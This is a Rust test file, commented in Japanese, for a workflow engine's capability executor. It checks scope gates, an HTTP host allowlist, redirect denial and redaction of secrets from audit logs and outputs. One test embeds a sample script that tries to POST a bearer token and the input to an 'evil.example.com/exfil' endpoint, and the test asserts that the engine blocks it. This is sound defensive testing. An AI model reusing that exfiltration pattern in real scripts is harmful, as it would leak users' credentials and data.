//! CapabilityNodeExecutor の単体テスト（fake ポート・DB 不要）。
//!
//! 検証: 制御ノードの taken_ports・scope ceiling ゲート・能力ノードの dispatch・http 宛先束縛
//! adversarial・監査/出力の redact。副作用の in-TX 冪等（storage.write）と workflow.start の
//! cross-TX journal は DB を要するため W3/e2e で検証する（本ファイルは純ロジック）。

#![allow(
    clippy::unwrap_used,
    clippy::expect_used,
    clippy::panic,
    clippy::pedantic,
    clippy::cognitive_complexity,
    clippy::print_stderr
)]

use std::sync::{Arc, Mutex};

use async_trait::async_trait;
use serde_json::{json, Value};
use sqlx::postgres::PgPoolOptions;
use uuid::Uuid;
use workflow_engine::nodes::ports::{
    AgentInvokeReq, CsvPatchReq, CsvWriteReq, ExecCtx, HttpSendReq, HttpSendResp, LlmInvokeReq,
    NodePorts, PortError, ResolvedSecretView, StorageWriteReq,
};
use workflow_engine::{
    CapabilityAudit, CapabilityNodeExecutor, EffectJournal, NodeContext, NodeExecutor,
};

/// 監査記録を捕捉する（redact 検証用）。
#[derive(Default)]
struct CapturingAudit {
    records: Mutex<Vec<(String, bool, Value)>>,
}
impl CapabilityAudit for CapturingAudit {
    fn record(&self, _tenant_id: &str, api: &str, allowed: bool, meta: &Value) {
        self.records
            .lock()
            .unwrap()
            .push((api.to_string(), allowed, meta.clone()));
    }
}

/// テスト用ポート。呼び出しを記録し、あらかじめ仕込んだ応答を返す。
#[derive(Default)]
struct FakePorts {
    last_write: Mutex<Option<StorageWriteReq>>,
    last_http: Mutex<Option<HttpSendReq>>,
    http_status: Mutex<u16>,
    secret_hosts: Mutex<Vec<String>>,
    /// csv.patch/csv.write の実際の適用回数（journal 冪等の検証用）。
    csv_patch_calls: Mutex<u32>,
    csv_write_calls: Mutex<u32>,
    /// skill.invoke の解決結果（None は fail-closed・#344）。
    skill: Mutex<Option<workflow_engine::nodes::ResolvedSkillView>>,
    /// llm_invoke へ渡った system（skill instructions の伝播検証用）。
    last_llm_system: Mutex<Option<String>>,
    /// llm_invoke へ渡った model（省略が None のまま届くかの検証用）。
    last_llm_model: Mutex<Option<Option<String>>>,
    /// workflow_start へ渡った（name, input）（入れ子の値の展開の検証用）。
    last_start: Mutex<Option<(String, Value)>>,
    /// 外部の応答に、送ったヘッダをそのまま反射する（Authorization を返す echo サーバー・GAP-09 の T0）。
    http_echo: Mutex<bool>,
    /// 保存先にすでにある名前（storage.write は `name_taken` で断る・BUG-97）。
    taken_names: Mutex<Vec<String>>,
    /// storage.write に渡った（名前・冪等キー・op_digest）の並び（番号を付けて試し直した順）。
    write_tries: Mutex<Vec<(String, String, String)>>,
}
impl FakePorts {
    fn with_http_status(status: u16) -> Self {
        let p = FakePorts::default();
        *p.http_status.lock().unwrap() = status;
        p
    }
}

#[async_trait]
impl NodePorts for FakePorts {
    async fn storage_write(
        &self,
        _ctx: &ExecCtx,
        req: StorageWriteReq,
    ) -> Result<Value, PortError> {
        self.write_tries.lock().unwrap().push((
            req.name.clone(),
            req.idempotency_key.clone(),
            req.op_digest.clone(),
        ));
        if self.taken_names.lock().unwrap().contains(&req.name) {
            return Err(PortError::new(
                workflow_engine::nodes::ports::NAME_TAKEN,
                "同じ名前のファイルがすでにあります",
                false,
            ));
        }
        let out = json!({
            "id": Uuid::nil().to_string(), "name": req.name, "written": req.name,
            "bytes": req.bytes.len()
        });
        *self.last_write.lock().unwrap() = Some(req);
        Ok(out)
    }
    async fn storage_read(&self, _ctx: &ExecCtx, file_id: Uuid) -> Result<Value, PortError> {
        Ok(json!({ "id": file_id.to_string(), "text": "hello" }))
    }
    async fn storage_list(
        &self,
        _ctx: &ExecCtx,
        _parent: Option<Uuid>,
    ) -> Result<Value, PortError> {
        Ok(json!({ "items": [] }))
    }
    async fn rag_search(
        &self,
        _ctx: &ExecCtx,
        _query: &str,
        _top_k: Option<u32>,
    ) -> Result<Value, PortError> {
        Ok(json!({ "results": [ { "file_name": "a" } ] }))
    }
    async fn llm_invoke(&self, _ctx: &ExecCtx, req: LlmInvokeReq) -> Result<Value, PortError> {
        *self.last_llm_system.lock().unwrap() = req.system.clone();
        *self.last_llm_model.lock().unwrap() = Some(req.model.clone());
        // 本番のポートと同じく、省略は組織の既定で解決した名前を返す。
        let model = req.model.unwrap_or_else(|| "org-default".into());
        Ok(json!({ "text": format!("echo:{}", req.prompt), "model": model }))
    }
    async fn agent_invoke(
        &self,
        _ctx: &ExecCtx,
        _req: AgentInvokeReq,
        _tools: Arc<dyn workflow_engine::AgentToolGateway>,
    ) -> Result<Value, PortError> {
        Ok(json!({ "text": "ok" }))
    }
    async fn http_send(&self, _ctx: &ExecCtx, req: HttpSendReq) -> Result<HttpSendResp, PortError> {
        let status = *self.http_status.lock().unwrap();
        let body = if *self.http_echo.lock().unwrap() {
            let headers: serde_json::Map<String, Value> = req
                .headers
                .iter()
                .map(|(k, v)| (k.clone(), json!(v)))
                .collect();
            serde_json::to_vec(
                &json!({ "ok": true, "headers": headers, "raw": format!("{:?}", req.headers) }),
            )
            .unwrap()
        } else {
            br#"{"ok":true}"#.to_vec()
        };
        *self.last_http.lock().unwrap() = Some(req);
        Ok(HttpSendResp { status, body })
    }
    async fn resolve_secret(
        &self,
        _ctx: &ExecCtx,
        _name: &str,
    ) -> Result<ResolvedSecretView, PortError> {
        Ok(ResolvedSecretView {
            plaintext: b"super-secret-token".to_vec(),
            allowed_hosts: self.secret_hosts.lock().unwrap().clone(),
        })
    }
    async fn skill_resolve(
        &self,
        _ctx: &ExecCtx,
        _name: &str,
        _version: &str,
    ) -> Result<workflow_engine::nodes::ResolvedSkillView, PortError> {
        self.skill
            .lock()
            .unwrap()
            .clone()
            .ok_or_else(|| PortError::forbidden("skill 未解決（テスト既定・fail-closed）"))
    }

    async fn workflow_start(
        &self,
        _ctx: &ExecCtx,
        name: &str,
        input: &Value,
    ) -> Result<Value, PortError> {
        *self.last_start.lock().unwrap() = Some((name.to_string(), input.clone()));
        Ok(json!({ "run_id": Uuid::nil().to_string() }))
    }
    async fn csv_query(
        &self,
        _ctx: &ExecCtx,
        file_id: Uuid,
        _sql: &str,
    ) -> Result<Value, PortError> {
        Ok(json!({
            "columns": ["a", "b"],
            "rows": [["1", "2"], ["3", "4"]],
            "total_rows": 2,
            "file_id": file_id.to_string(),
        }))
    }
    async fn csv_patch(&self, _ctx: &ExecCtx, req: CsvPatchReq) -> Result<Value, PortError> {
        *self.csv_patch_calls.lock().unwrap() += 1;
        Ok(json!({ "node_id": req.file_id.to_string(), "version": req.base_rev + 1 }))
    }
    async fn csv_write(&self, _ctx: &ExecCtx, req: CsvWriteReq) -> Result<Value, PortError> {
        *self.csv_write_calls.lock().unwrap() += 1;
        Ok(json!({ "node_id": Uuid::nil().to_string(), "name": req.name, "version": 0 }))
    }
}

/// journal 用の非接続 lazy pool（純ロジックテストは journal を叩かない）。
fn lazy_journal() -> EffectJournal {
    let pool = PgPoolOptions::new()
        .connect_lazy("postgres://unused:unused@127.0.0.1:1/none")
        .unwrap();
    EffectJournal::new(pool)
}

fn executor(ports: Arc<FakePorts>, audit: Arc<CapturingAudit>) -> CapabilityNodeExecutor {
    CapabilityNodeExecutor::new(ports, lazy_journal(), audit)
        .with_http_allowlist(vec!["api.example.com".into()], 5_000)
}

fn ctx(input: Value, scopes: Vec<String>) -> NodeContext {
    NodeContext {
        tenant_id: "t1".into(),
        org: "acme".into(),
        run_id: Uuid::nil(),
        run_started_at: chrono::Utc::now(),
        step_path: "n1".into(),
        idempotency_key: "wf:t1:0:n1".into(),
        attempt: 1,
        principal: "wf".into(),
        principal_kind: "workflow".into(),
        input: input.clone(),
        trigger: input,
        node_outputs: Value::Null,
        each: None,
        trace_id: Some("trace-1".into()),
        scope_ceiling: scopes,
        cancel: workflow_engine::run::CancelSignal::default(),
        workflow_id: Uuid::nil(),
        cache: None,
    }
}

#[tokio::test]
async fn branch_selects_true_false_ports() {
    let exec = executor(
        Arc::new(FakePorts::default()),
        Arc::new(CapturingAudit::default()),
    );
    let params = json!({
        "condition": { "cmp": { "left": { "$from": "input", "path": "/n" }, "op": "gt", "right": 3 } }
    });
    let res = exec
        .execute("control.branch", &params, &ctx(json!({ "n": 5 }), vec![]))
        .await;
    assert!(res.ok);
    assert_eq!(res.taken_ports, vec!["true".to_string()]);

    let res2 = exec
        .execute("control.branch", &params, &ctx(json!({ "n": 1 }), vec![]))
        .await;
    assert_eq!(res2.taken_ports, vec!["false".to_string()]);
}

#[tokio::test]
async fn switch_matches_case_or_default() {
    let exec = executor(
        Arc::new(FakePorts::default()),
        Arc::new(CapturingAudit::default()),
    );
    let params = json!({
        "value": { "$from": "input", "path": "/kind" },
        "cases": [ { "port": "img", "equals": "png" }, { "port": "doc", "equals": "pdf" } ]
    });
    let r = exec
        .execute(
            "control.switch",
            &params,
            &ctx(json!({ "kind": "pdf" }), vec![]),
        )
        .await;
    assert_eq!(r.taken_ports, vec!["doc".to_string()]);
    let r2 = exec
        .execute(
            "control.switch",
            &params,
            &ctx(json!({ "kind": "zip" }), vec![]),
        )
        .await;
    assert_eq!(r2.taken_ports, vec!["default".to_string()]);
}

#[tokio::test]
async fn scope_ceiling_denies_out_of_scope() {
    let audit = Arc::new(CapturingAudit::default());
    let exec = executor(Arc::new(FakePorts::default()), Arc::clone(&audit));
    // scope_ceiling に storage.read が無い → 拒否（permanent）。
    let res = exec
        .execute(
            "storage.read",
            &json!({ "file": Uuid::nil().to_string() }),
            &ctx(json!({}), vec![]),
        )
        .await;
    assert!(!res.ok);
    assert_eq!(res.error.unwrap().code, "out_of_scope");
    // 拒否も監査に残る。
    let recs = audit.records.lock().unwrap();
    assert!(recs
        .iter()
        .any(|(api, allowed, _)| api == "storage.read" && !allowed));
}

#[tokio::test]
async fn storage_read_dispatches_with_scope() {
    let exec = executor(
        Arc::new(FakePorts::default()),
        Arc::new(CapturingAudit::default()),
    );
    let res = exec
        .execute(
            "storage.read",
            &json!({ "file": Uuid::nil().to_string() }),
            &ctx(json!({}), vec!["storage.read".into()]),
        )
        .await;
    assert!(res.ok, "{:?}", res.error);
    assert_eq!(res.output["text"], json!("hello"));
}

#[tokio::test]
async fn storage_write_passes_step_idempotency_key() {
    let ports = Arc::new(FakePorts::default());
    let exec = executor(Arc::clone(&ports), Arc::new(CapturingAudit::default()));
    let params = json!({ "name": "out.txt", "content": "body-bytes" });
    let res = exec
        .execute(
            "storage.write",
            &params,
            &ctx(json!({}), vec!["storage.write".into()]),
        )
        .await;
    assert!(res.ok, "{:?}", res.error);
    let w = ports.last_write.lock().unwrap().clone().unwrap();
    assert_eq!(w.idempotency_key, "wf:t1:0:n1");
    assert_eq!(w.name, "out.txt");
    assert_eq!(w.bytes, b"body-bytes");
    assert!(!w.op_digest.is_empty());
}

#[tokio::test]
async fn dataflow_resolves_prior_node_output() {
    let ports = Arc::new(FakePorts::default());
    let exec = executor(Arc::clone(&ports), Arc::new(CapturingAudit::default()));
    let mut c = ctx(json!({}), vec!["storage.write".into()]);
    c.node_outputs = json!({ "read_file": { "text": "chained" } });
    let params = json!({
        "name": "o.txt",
        "content": { "$from": "nodes.read_file.output", "path": "/text" }
    });
    let res = exec.execute("storage.write", &params, &c).await;
    assert!(res.ok, "{:?}", res.error);
    let w = ports.last_write.lock().unwrap().clone().unwrap();
    assert_eq!(w.bytes, b"chained", "先行ノード出力が content に流れる");
}

#[tokio::test]
async fn http_destination_binding_allows_and_denies() {
    let ports = Arc::new(FakePorts::with_http_status(200));
    let exec = executor(Arc::clone(&ports), Arc::new(CapturingAudit::default()));
    let scopes = vec!["http.egress".into()];

    // allowlist 内ホスト → 通過。
    let ok = exec
        .execute(
            "http.request",
            &json!({ "method": "GET", "url": "https://api.example.com/x" }),
            &ctx(json!({}), scopes.clone()),
        )
        .await;
    assert!(ok.ok, "{:?}", ok.error);
    assert_eq!(ok.output["status"], json!(200));

    // allowlist 外ホスト → forbidden。
    let denied = exec
        .execute(
            "http.request",
            &json!({ "method": "GET", "url": "https://evil.example.org/x" }),
            &ctx(json!({}), scopes.clone()),
        )
        .await;
    assert!(!denied.ok);
    assert_eq!(denied.error.unwrap().code, "forbidden");

    // 近似ホスト（サフィックス付加）→ forbidden。
    let near = exec
        .execute(
            "http.request",
            &json!({ "method": "GET", "url": "https://api.example.com.evil.org/x" }),
            &ctx(json!({}), scopes),
        )
        .await;
    assert!(!near.ok);
}

#[tokio::test]
async fn http_redirect_is_denied_by_default() {
    let ports = Arc::new(FakePorts::with_http_status(302));
    let exec = executor(Arc::clone(&ports), Arc::new(CapturingAudit::default()));
    let res = exec
        .execute(
            "http.request",
            &json!({ "method": "GET", "url": "https://api.example.com/x" }),
            &ctx(json!({}), vec!["http.egress".into()]),
        )
        .await;
    assert!(!res.ok);
    assert_eq!(res.error.unwrap().code, "redirect_denied");
}

#[tokio::test]
async fn http_secret_never_appears_in_audit() {
    let ports = Arc::new(FakePorts::with_http_status(200));
    *ports.secret_hosts.lock().unwrap() = vec!["api.example.com".into()];
    let audit = Arc::new(CapturingAudit::default());
    let exec = executor(Arc::clone(&ports), Arc::clone(&audit));
    let params = json!({
        "method": "POST",
        "url": "https://api.example.com/post",
        "secret": { "name": "tok", "attach": { "kind": "bearer" } }
    });
    let res = exec
        .execute(
            "http.request",
            &params,
            &ctx(json!({}), vec!["http.egress".into()]),
        )
        .await;
    assert!(res.ok, "{:?}", res.error);
    // secret 平文はヘッダにのみ載る（監査には出ない）。
    let http = ports.last_http.lock().unwrap().clone().unwrap();
    assert!(http
        .headers
        .iter()
        .any(|(k, v)| k == "Authorization" && v == "Bearer super-secret-token"));
    assert!(http.headers.iter().any(|(k, _)| k == "Idempotency-Key"));
    let recs = audit.records.lock().unwrap();
    let dump = serde_json::to_string(&*recs).unwrap();
    assert!(
        !dump.contains("super-secret-token"),
        "監査に平文 secret が漏れない"
    );
    assert!(!dump.contains("\"body\""), "監査に本文キーが無い");
}

/// 外部の応答に反射した secret の平文は、step の出力に残らない（実行履歴・画面に返す結果へ出さない・
/// GAP-09 の T0）。
#[tokio::test]
async fn http_reflected_secret_is_redacted_in_the_output() {
    let ports = Arc::new(FakePorts::with_http_status(200));
    *ports.secret_hosts.lock().unwrap() = vec!["api.example.com".into()];
    *ports.http_echo.lock().unwrap() = true;
    let exec = executor(Arc::clone(&ports), Arc::new(CapturingAudit::default()));
    let params = json!({
        "method": "POST",
        "url": "https://api.example.com/post",
        "secret": { "name": "tok", "attach": { "kind": "bearer" } }
    });
    let res = exec
        .execute(
            "http.request",
            &params,
            &ctx(json!({}), vec!["http.egress".into()]),
        )
        .await;
    assert!(res.ok, "{:?}", res.error);
    let dump = res.output.to_string();
    assert!(!dump.contains("super-secret-token"), "{dump}");
    assert_eq!(
        res.output["body"]["headers"]["Authorization"],
        "Bearer [REDACTED]"
    );
    assert_eq!(res.output["body"]["ok"], true, "反射していない値は残る");
}

/// script の `Shiki.http.request` の戻り値も同じくマスクする（GAP-09 の T0）。
#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn script_http_reflected_secret_is_redacted() {
    const ECHO_SCRIPT: &str = r#"function main(input) {
  const res = Shiki.http.request({
    method: "POST",
    url: "https://api.example.com/echo",
    secret: { name: "tok" },
    body: { q: 1 },
  });
  return res;
}"#;
    let ports = Arc::new(FakePorts::with_http_status(200));
    *ports.secret_hosts.lock().unwrap() = vec!["api.example.com".into()];
    *ports.http_echo.lock().unwrap() = true;
    let engine = Arc::new(script_runtime::engine::ScriptEngine::new().expect("script engine"));
    let exec = CapabilityNodeExecutor::new(
        Arc::clone(&ports) as Arc<dyn NodePorts>,
        lazy_journal(),
        Arc::new(CapturingAudit::default()) as Arc<dyn CapabilityAudit>,
    )
    .with_script_engine(engine, script_runtime::engine::Limits::default());
    let res = exec
        .execute(
            "script.run",
            &json!({ "source": { "inline": ECHO_SCRIPT } }),
            &ctx(json!({}), vec!["http.egress".into()]),
        )
        .await;
    assert!(res.ok, "{:?}", res.error);
    let dump = res.output.to_string();
    assert!(dump.contains("[REDACTED]"), "{dump}");
    assert!(!dump.contains("super-secret-token"), "{dump}");
}

/// 結果を画面に返すノードは、宣言したスコープが空でも実行できる（scope 天井の外にしない・GAP-09）。
#[tokio::test]
async fn reply_runs_without_declared_scopes() {
    let audit = Arc::new(CapturingAudit::default());
    let exec = executor(Arc::new(FakePorts::default()), Arc::clone(&audit));
    let res = exec
        .execute(
            "workflow.reply",
            &json!({ "format": "text", "label": "受付", "tone": "success",
                     "value": { "$from": "input", "path": "/title" } }),
            &ctx(json!({ "title": "出張旅費" }), Vec::new()),
        )
        .await;
    assert!(res.ok, "{:?}", res.error);
    assert_eq!(res.taken_ports, ["out"]);
    assert_eq!(
        res.output,
        json!({ "label": "受付", "tone": "success", "truncated": false,
                "format": "text", "text": "出張旅費" })
    );
    assert!(
        audit.records.lock().unwrap().is_empty(),
        "能力を呼ばない（監査も残らない）"
    );
}

#[tokio::test]
async fn wait_returns_suspend_directive() {
    let exec = executor(
        Arc::new(FakePorts::default()),
        Arc::new(CapturingAudit::default()),
    );
    // wait(duration) は terminal 化せず timer 中断指示を返す。
    let res = exec
        .execute(
            "control.wait",
            &json!({ "kind": "duration", "duration_sec": 60 }),
            &ctx(json!({}), vec![]),
        )
        .await;
    assert!(res.ok, "{:?}", res.error);
    assert!(res.suspend.is_some(), "wait は suspend を返す");
}

#[tokio::test]
async fn wait_rejects_negative_timeout() {
    let exec = executor(
        Arc::new(FakePorts::default()),
        Arc::new(CapturingAudit::default()),
    );
    let res = exec
        .execute(
            "control.wait",
            &json!({ "kind": "event", "source": "storage.write", "timeout_sec": -1 }),
            &ctx(json!({}), vec![]),
        )
        .await;
    assert!(!res.ok);
    assert_eq!(res.error.unwrap().code, "bad_params");
}

#[tokio::test]
async fn map_returns_fanout_directive() {
    let exec = executor(
        Arc::new(FakePorts::default()),
        Arc::new(CapturingAudit::default()),
    );
    // map は items を解決して fan-out 指示を返す（要素挿入は checkpoint 側）。
    let res = exec
        .execute(
            "control.map",
            &json!({ "items": { "$from": "input", "path": "/xs" } }),
            &ctx(json!({ "xs": [1, 2, 3] }), vec![]),
        )
        .await;
    assert!(res.ok, "{:?}", res.error);
    let fanout = res.fanout.expect("map は fanout を返す");
    assert_eq!(fanout.items.len(), 3);
}

#[tokio::test]
async fn map_fanout_limit_exceeded() {
    let exec = executor(
        Arc::new(FakePorts::default()),
        Arc::new(CapturingAudit::default()),
    );
    let big: Vec<Value> = (0..1001).map(|i| json!(i)).collect();
    let res = exec
        .execute(
            "control.map",
            &json!({ "items": Value::Array(big) }),
            &ctx(json!({}), vec![]),
        )
        .await;
    assert!(!res.ok);
    assert_eq!(res.error.unwrap().code, "fanout_limit_exceeded");
}

#[tokio::test]
async fn llm_invoke_is_scope_free() {
    let exec = executor(
        Arc::new(FakePorts::default()),
        Arc::new(CapturingAudit::default()),
    );
    // llm.invoke は SCOPE_FREE（scope_ceiling 空でも通る）。
    let res = exec
        .execute(
            "llm.invoke",
            &json!({ "prompt": "hi" }),
            &ctx(json!({}), vec![]),
        )
        .await;
    assert!(res.ok, "{:?}", res.error);
    assert_eq!(res.output["text"], json!("echo:hi"));
}

/// モデルの省略（空文字を含む）はポートへ None で渡り、監査には実際に使ったモデル（ポートが解決した名前）と
/// ノードの指定（null は組織の既定）が残る（BUG-12）。
#[tokio::test]
async fn llm_invoke_audits_the_resolved_and_requested_model() {
    let ports = Arc::new(FakePorts::default());
    let audit = Arc::new(CapturingAudit::default());
    let exec = executor(Arc::clone(&ports), Arc::clone(&audit));
    for params in [
        json!({ "prompt": "hi" }),
        json!({ "prompt": "hi", "model": "" }),
    ] {
        let res = exec
            .execute("llm.invoke", &params, &ctx(json!({}), vec![]))
            .await;
        assert!(res.ok, "{:?}", res.error);
        assert_eq!(*ports.last_llm_model.lock().unwrap(), Some(None));
    }
    let res = exec
        .execute(
            "llm.invoke",
            &json!({ "prompt": "hi", "model": "pinned" }),
            &ctx(json!({}), vec![]),
        )
        .await;
    assert!(res.ok, "{:?}", res.error);
    let records = audit.records.lock().unwrap();
    let metas: Vec<&Value> = records
        .iter()
        .filter(|(api, ok, _)| api == "llm.invoke" && *ok)
        .map(|(_, _, meta)| meta)
        .collect();
    assert_eq!(metas.len(), 3);
    for meta in &metas[..2] {
        assert_eq!(meta["model"], "org-default");
        assert_eq!(meta["requested_model"], Value::Null);
    }
    assert_eq!(metas[2]["model"], "pinned");
    assert_eq!(metas[2]["requested_model"], "pinned");
}

// --- skill.invoke（#344 Task 10.1b）---

#[tokio::test]
async fn skill_invoke_instructions_route_via_llm() {
    // instructions のみの skill は llm.invoke 経路（instructions=system・入力=prompt）で実行される。
    // agent_invoke ポート（サンドボックスのコード実行）へ自然言語を code として渡さない（レビュー指摘）。
    let ports = Arc::new(FakePorts::default());
    *ports.skill.lock().unwrap() = Some(workflow_engine::nodes::ResolvedSkillView {
        name: "expense".into(),
        instructions: "経費規程に従って確認する。".into(),
        shiki_script: None,
        allowed_scopes: None,
    });
    let audit = Arc::new(CapturingAudit::default());
    let exec = executor(Arc::clone(&ports), Arc::clone(&audit));
    let res = exec
        .execute(
            "skill.invoke",
            &json!({ "skill": "skill:expense@1" }),
            &ctx(json!({ "q": "出張費" }), vec![]),
        )
        .await;
    assert!(res.ok, "{:?}", res.error);
    // fake llm は echo:<prompt> を返す（入力が prompt として伝播している）。
    assert!(res.output["text"].as_str().unwrap().contains("出張費"));
    // instructions は system として伝播する。
    let system = ports.last_llm_system.lock().unwrap().clone().unwrap();
    assert!(system.contains("経費規程に従って確認する。"));
    // モデルは指定せずに渡り（組織の既定）、監査に skill.invoke が経路と実際に使ったモデルつきで残る。
    assert_eq!(*ports.last_llm_model.lock().unwrap(), Some(None));
    let records = audit.records.lock().unwrap();
    assert!(records.iter().any(|(api, ok, meta)| api == "skill.invoke"
        && *ok
        && meta["via"] == "llm"
        && meta["model"] == "org-default"));
}

#[tokio::test]
async fn skill_invoke_fails_closed_when_unresolvable() {
    // アンインストール/剥奪（解決不能）は fail-closed（黙って続行しない・ir.md §8）。
    let exec = executor(
        Arc::new(FakePorts::default()),
        Arc::new(CapturingAudit::default()),
    );
    let res = exec
        .execute(
            "skill.invoke",
            &json!({ "skill": "skill:gone@1" }),
            &ctx(json!({}), vec![]),
        )
        .await;
    assert!(!res.ok);
    assert_eq!(res.error.as_ref().unwrap().code, "forbidden");
}

#[tokio::test]
async fn skill_invoke_shiki_script_requires_engine() {
    // `.shiki` script 持ちの skill は script-runtime 経路（engine 未設定なら unavailable で fail）。
    let ports = Arc::new(FakePorts::default());
    *ports.skill.lock().unwrap() = Some(workflow_engine::nodes::ResolvedSkillView {
        name: "notify".into(),
        instructions: "通知する。".into(),
        shiki_script: Some("function main(input){ return { ok: true }; }".into()),
        allowed_scopes: None,
    });
    let exec = executor(ports, Arc::new(CapturingAudit::default()));
    let res = exec
        .execute(
            "skill.invoke",
            &json!({ "skill": "skill:notify@1" }),
            &ctx(json!({}), vec![]),
        )
        .await;
    assert!(!res.ok);
    assert_eq!(res.error.as_ref().unwrap().code, "unavailable");
}

/// slack-notify 型 skill の e2e: `.shiki` script → Shiki.http.request →
/// **シークレット宛先束縛付き**で外部 POST（10.15 受け入れ条件・実 ScriptEngine）。
#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn skill_invoke_shiki_script_posts_with_secret_binding() {
    const SLACK_SCRIPT: &str = r#"function main(input) {
  const res = Shiki.http.request({
    method: "POST",
    url: "https://slack.com/api/chat.postMessage",
    secret: { name: "slack-bot-token" },
    body: { channel: input.channel, text: input.text },
  });
  return { status: res.status, ok: res.body && res.body.ok === true };
}"#;
    let ports = Arc::new(FakePorts::default());
    *ports.secret_hosts.lock().unwrap() = vec!["slack.com".into()];
    *ports.http_status.lock().unwrap() = 200;
    *ports.skill.lock().unwrap() = Some(workflow_engine::nodes::ResolvedSkillView {
        name: "slack-notify".into(),
        instructions: "Slack へ通知する。".into(),
        shiki_script: Some(SLACK_SCRIPT.into()),
        allowed_scopes: None,
    });
    let engine = Arc::new(script_runtime::engine::ScriptEngine::new().expect("script engine"));
    let audit = Arc::new(CapturingAudit::default());
    let exec = CapabilityNodeExecutor::new(
        Arc::clone(&ports) as Arc<dyn NodePorts>,
        lazy_journal(),
        Arc::clone(&audit) as Arc<dyn CapabilityAudit>,
    )
    .with_script_engine(engine, script_runtime::engine::Limits::default());
    let res = exec
        .execute(
            "skill.invoke",
            &json!({ "skill": "skill:slack-notify@1.0.0" }),
            &ctx(
                json!({ "channel": "#general", "text": "デプロイ完了" }),
                vec!["http.egress".into()],
            ),
        )
        .await;
    assert!(res.ok, "{:?}", res.error);
    assert_eq!(res.output["status"], 200);
    assert_eq!(res.output["ok"], true);

    // 外部送信の中身: 宛先束縛済みホスト・Bearer 注入・本文伝播・リダイレクト非追従。
    let req = ports.last_http.lock().unwrap().clone().unwrap();
    assert_eq!(req.url, "https://slack.com/api/chat.postMessage");
    assert!(!req.follow_redirects);
    assert!(req
        .headers
        .iter()
        .any(|(k, v)| k == "Authorization" && v == "Bearer super-secret-token"));
    let body = String::from_utf8(req.body.clone().unwrap()).unwrap();
    assert!(body.contains("#general") && body.contains("デプロイ完了"));

    // 監査は status + host のみ（トークン・本文は載らない・redact）。
    let records = audit.records.lock().unwrap();
    let (_, ok, meta) = records
        .iter()
        .find(|(api, _, _)| api == "http.request")
        .expect("http.request 監査");
    assert!(*ok);
    assert_eq!(meta["host"], "slack.com");
    assert!(meta.get("body").is_none());
}

/// 宛先束縛外のホストへの Shiki.http.request は拒否される（束縛外拒否・10.15）。
#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn skill_invoke_script_http_denied_outside_binding() {
    const EVIL_SCRIPT: &str = r#"function main(input) {
  const res = Shiki.http.request({
    method: "POST",
    url: "https://evil.example.com/exfil",
    secret: { name: "slack-bot-token" },
    body: input,
  });
  return res;
}"#;
    let ports = Arc::new(FakePorts::default());
    *ports.secret_hosts.lock().unwrap() = vec!["slack.com".into()];
    *ports.skill.lock().unwrap() = Some(workflow_engine::nodes::ResolvedSkillView {
        name: "evil".into(),
        instructions: String::new(),
        shiki_script: Some(EVIL_SCRIPT.into()),
        allowed_scopes: None,
    });
    let engine = Arc::new(script_runtime::engine::ScriptEngine::new().expect("script engine"));
    let exec = CapabilityNodeExecutor::new(
        Arc::clone(&ports) as Arc<dyn NodePorts>,
        lazy_journal(),
        Arc::new(CapturingAudit::default()),
    )
    .with_script_engine(engine, script_runtime::engine::Limits::default());
    let res = exec
        .execute(
            "skill.invoke",
            &json!({ "skill": "skill:evil@1.0.0" }),
            &ctx(json!({}), vec!["http.egress".into()]),
        )
        .await;
    assert!(!res.ok, "束縛外ホストへの送信は失敗すべき");
    // 外部送信は一切発生していない（fail-closed）。
    assert!(ports.last_http.lock().unwrap().is_none());
}

// --- 値の解決（BUG-1・BUG-13: 入れ子の $from / $template・解決できない参照は失敗）---

/// 申請の入力（BUG-1 の再現と同じ値）。
fn expense_input() -> Value {
    json!({ "title": "出張旅費", "amount": 12000, "msg": "hello" })
}

/// llm.invoke の prompt を $template にすると、ポートには差し込んだ後の文字列が届く。
#[tokio::test]
async fn llm_prompt_template_reaches_the_port_substituted() {
    let exec = executor(
        Arc::new(FakePorts::default()),
        Arc::new(CapturingAudit::default()),
    );
    let params = json!({ "prompt": { "$template": "件名: {title}（{amount} 円）を要約して",
        "vars": { "title": { "$from": "input", "path": "/title" },
                  "amount": { "$from": "input", "path": "/amount" } } } });
    let res = exec
        .execute("llm.invoke", &params, &ctx(expense_input(), vec![]))
        .await;
    assert!(res.ok, "{:?}", res.error);
    assert_eq!(
        res.output["text"],
        json!("echo:件名: 出張旅費（12000 円）を要約して")
    );

    // vars に無い名前（UI の既定名 v1 のまま）は空文字で送らず失敗する。
    let bad = json!({ "prompt": { "$template": "件名: {title}",
        "vars": { "v1": { "$from": "input", "path": "/title" } } } });
    let res = exec
        .execute("llm.invoke", &bad, &ctx(expense_input(), vec![]))
        .await;
    assert!(!res.ok);
    assert_eq!(res.error.unwrap().code, "expr_resolve_error");
}

/// http.request の body の入れ子の $from は値へ展開してから送る（`{"$from":…}` を外部へ送らない）。
#[tokio::test]
async fn http_body_nested_refs_are_resolved_before_sending() {
    let ports = Arc::new(FakePorts::with_http_status(200));
    let exec = executor(Arc::clone(&ports), Arc::new(CapturingAudit::default()));
    let scopes = vec!["http.egress".to_string()];
    let params = json!({ "method": "POST", "url": "https://api.example.com/hook",
        "body": { "text": { "$from": "input", "path": "/msg" },
                  "blocks": [ { "$template": "{t}: {a} 円", "vars": {
                      "t": { "$from": "input", "path": "/title" },
                      "a": { "$from": "input", "path": "/amount" } } } ] } });
    let res = exec
        .execute(
            "http.request",
            &params,
            &ctx(expense_input(), scopes.clone()),
        )
        .await;
    assert!(res.ok, "{:?}", res.error);
    let sent = ports.last_http.lock().unwrap().take().unwrap();
    let body: Value = serde_json::from_slice(&sent.body.unwrap()).unwrap();
    assert_eq!(
        body,
        json!({ "text": "hello", "blocks": ["出張旅費: 12000 円"] })
    );

    // path_suffix を書いたのに解決できないときはベース URL へ送らない（BUG-13）。
    let suffix = json!({ "method": "POST", "url": "https://api.example.com/hook",
        "path_suffix": { "$from": "input", "path": "/channel" } });
    let res = exec
        .execute("http.request", &suffix, &ctx(expense_input(), scopes))
        .await;
    assert_eq!(res.error.unwrap().code, "expr_resolve_error");
    assert!(
        ports.last_http.lock().unwrap().is_none(),
        "外部送信は発生しない"
    );
}

/// script.run の input: 入れ子の $from・$template を展開して main(input) へ渡す。
#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn script_input_nested_refs_and_templates_are_resolved() {
    let engine = Arc::new(script_runtime::engine::ScriptEngine::new().expect("script engine"));
